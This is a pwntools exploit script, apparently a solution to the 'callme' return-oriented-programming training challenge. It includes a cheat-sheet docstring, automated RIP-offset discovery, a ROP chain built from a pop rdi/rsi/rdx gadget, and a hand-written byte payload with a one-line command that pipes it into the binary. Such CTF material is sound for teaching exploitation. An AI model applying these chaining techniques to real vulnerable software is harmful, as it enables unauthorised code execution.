from pwn import *

"""
How to:
    Check the file for security features
        checksec --file=<binary>                            #Check the security on the binary
    Check the binary for interesting things    
        rabin2 -qs <binary>                                 #Functions inside of the binary
        rabin2 -i <binary>                                  #Imported functions and where they are located
        rabin2 -z <binary>                                  #Programmer specific strings
        objdump -D <binary>                                 #Disassembles everything on the binary
       
    Inside of gdb:
        info functions                                      #Shows the functions
        disas <function>                                    #Shows the assembly for the function specified
        p <string>                                          #Grabs the address of the specified object
        search "<string>"                                   #Search for a string and show its address
        jump <function or *Address>                         #Jumps to function or address
        b <function or *Address>                            #Sets up a breakpoint
        More into the potatos (32):
            pattern create <#> {output file}                #Creates a pattern for finding offset
            pattern offset <#>                              #Finds the offset mentioned
     
    64Bit differences:
        Need to grab the RSP beginning instead  
        If the address is only 4 bytes, pad to 8 
        ropper -f <binary>                                  #Shows all rop gadgets in a binary
        ropper -f <binary> --search "pop rdi"               #Shows all rop gadgets that can pop RDI (For system calls, you need to have the target in RDI)
        ***For 64 Bit, Gadget -> Variables -> Location***
            Example
                print('A'*40 + '\xc3\x07\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x60\x05\x40\x00\x00\x00\x00\x00')
                      Buffer ->           POP RDI call            ->     What is going into RDI        ->          System()
    
    ARMv5 difference:
        EIP/RIP is now PC
        POP r#, pc is the Arm equiv for the pop rdi
        
    MIPS difference:
        EIP/RIP/PC is now ra
        GDB doesn't like it so you can't use it      #Requires manual checking along with exploit dev
        
"""

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './callme'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'info'
# Deletes core files if used
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Grab function symbols
callme_one = elf.symbols['callme_one']
callme_two = elf.symbols['callme_two']
callme_three = elf.symbols['callme_three']

# Print out target addresses
info("%#x callme_one", callme_one)
info("%#x callme_two", callme_two)
info("%#x callme_three", callme_three)

# Find Buffer overflow
payload = cyclic(100)

# Send payload
io.sendlineafter("> ", payload)

# Wait for crash
io.wait()

# Displaying what the bits for the program is
info("Running offset check for {} Bits".format(context.bits))

# Read the crash file
core = io.corefile

# Locate for 64 bits
if context.bits == 64:
    # Locate RIP value and offset
    stack = core.rsp
    # Looks for the first 4 characters of the rsp to find the offset for RIP
    pattern = core.read(stack,4)
    # Finds RIP offset with pattern
    offset = cyclic_find(pattern)
    # Display offset
    info("Located RIP at {a}".format(a=offset))

# Locate for 32 bits
elif context.bits == 32:
    # Locate EIP value and offset
    eip_value = core.eip
    offset = cyclic_find(eip_value)
    # Display offset
    info("Located EIP at {a}".format(a=offset))

# Set up pwntools ROP chain
rop = ROP(elf)

# Find a gadget that pops 3 registers
pop3 = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"] )[0]

# Print ROP gadget's location
info("%#x ROP gadget", pop3)

# Build the payload
payload = flat({
    offset: [pop3,
    0xdeadbeefdeadbeef, 
    0xcafebabecafebabe, 
    0xd00df00dd00df00d,
    callme_one,
    pop3,
    0xdeadbeefdeadbeef, 
    0xcafebabecafebabe, 
    0xd00df00dd00df00d,
    callme_two,
    pop3,
    0xdeadbeefdeadbeef, 
    0xcafebabecafebabe, 
    0xd00df00dd00df00d,
    callme_three
    ]
})
'''
    eip_offset:   # Triggers BoF
    [callme_one,  # Go to function 1
    pop3,         # Pop the next 3 args
    0xdeadbeef,   # Arg 1
    0xcafebabe,   # Arg 2
    0xd00df00d,   # Arg 3
    callme_two,   # Rinse and repeat for next 2
    pop3,
    0xdeadbeef, 
    0xcafebabe, 
    0xd00df00d,
    callme_three,
    pop3,
    0xdeadbeef, 
    0xcafebabe, 
    0xd00df00d
'''

# Save the payload to file
write('payload', payload)

# Start the process again
io = start()

# Send the payload
io.sendlineafter('> ', payload)
io.recvuntil('Thank you!\n')

# Or, Get our flag!
flag = io.recv()

try:
    success(flag)
except AttributeError:
    print("[+] Flag: {}".format(str(flag)))


'''
# Where to start?
  Ghidra shows in a usefulFunction that you need to call callme_one/two/three
  Instructions on page and libcallme32.so show arguments need to be 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d
  Also says and functions show you need to do it in order from 1 -> 3
    ***As before for 64, Gadget -> variables -> location***
  Lastly, you will need to return to the gadget after every call to stabalize the calls

# Manual Exploitation
0x0000000000400720  callme_one@plt   '\x20\x07\x40\x00\x00\x00\x00\x00'
0x0000000000400740  callme_two@plt   '\x40\x07\x40\x00\x00\x00\x00\x00'
0x00000000004006f0  callme_three@plt '\xf0\x06\x40\x00\x00\x00\x00\x00'

0xdeadbeefdeadbeef, 
0xcafebabecafebabe, 
0xd00df00dd00df00d

0x000000000040093c: pop rdi; pop rsi; pop rdx; ret;  '\x3c\x09\x40\x00\x00\x00\x00\x00'

# Functions
1 '\x20\x07\x40\x00\x00\x00\x00\x00'
2 '\x40\x07\x40\x00\x00\x00\x00\x00'
3 '\xf0\x06\x40\x00\x00\x00\x00\x00'

# Gadget
'\x3c\x09\x40\x00\x00\x00\x00\x00'

# Args
'\xef\xbe\xad\xde\xef\xbe\xad\xde'
'\xbe\xba\xfe\xca\xbe\xba\xfe\xca'
'\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0'

# Function 1 with args
'\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\x20\x07\x40\x00\x00\x00\x00\x00'
# Function 2 with args
'\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\x40\x07\x40\x00\x00\x00\x00\x00'
# Function 3 with args
'\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\xf0\x06\x40\x00\x00\x00\x00\x00'

# Full manual exploit command
python -c "print 'A' * 40 + '\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\x20\x07\x40\x00\x00\x00\x00\x00' + '\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\x40\x07\x40\x00\x00\x00\x00\x00' + '\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\xf0\x06\x40\x00\x00\x00\x00\x00'" | ./callme 
'''
